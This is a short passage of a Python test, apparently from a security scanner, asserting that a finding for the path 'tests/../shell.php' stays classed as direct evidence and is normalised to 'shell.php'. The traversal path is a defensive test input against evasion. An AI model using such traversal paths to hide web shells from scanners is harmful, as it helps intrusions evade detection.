        assert web[0].evidence_class == "direct", (
            f"tests/../shell.php was demoted to {web[0].evidence_class!r}; the "
            f"escaped tests/ segment must not demote (FIX 2 + FIX 3)")
        assert web[0].file == "shell.php"  # collapsed, no .., no tests/ prefix
